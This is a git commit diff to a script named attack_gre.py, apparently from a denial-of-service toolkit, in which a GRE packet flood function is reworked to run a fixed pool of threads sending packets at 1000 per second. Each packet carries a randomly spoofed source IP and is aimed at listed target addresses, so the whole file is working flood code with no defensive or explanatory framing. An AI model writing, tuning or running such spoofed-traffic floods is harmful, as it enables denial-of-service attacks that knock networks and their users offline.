04d8cf8f2dd52375412e01f79b3bd08836ee26ff
Nomads Developer <57294366+nomadsdev@users.noreply.github.com>
2024-09-05 03:37:09 +0700

    gre up

--- attack_gre.py
+++ attack_gre.py
@@ -15,20 +15,25 @@ def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64)
     
     return packet
 
-def send_gre_ip_packets(target_ips, num_packets=10):
+def send_gre_ip_packets(target_ips, num_packets=10, num_threads=10):
     def send_packets():
         for _ in range(num_packets):
             for target_ip in target_ips:
                 source_ip = random_ip()
                 packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
-                sendpfast(packet, pps=0, loop=0, verbose=False)
+                sendpfast(packet, pps=1000, verbose=False)
     
-    while True:
+    threads = []
+    for _ in range(num_threads):
         thread = threading.Thread(target=send_packets)
+        threads.append(thread)
         thread.start()
+    
+    for thread in threads:
+        thread.join()
 
 def random_ip():
     return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
 
 target_ips = ["192.168.1.1", "192.168.1.2"]
-send_gre_ip_packets(target_ips, num_packets=1000)
+send_gre_ip_packets(target_ips, num_packets=1000, num_threads=10)
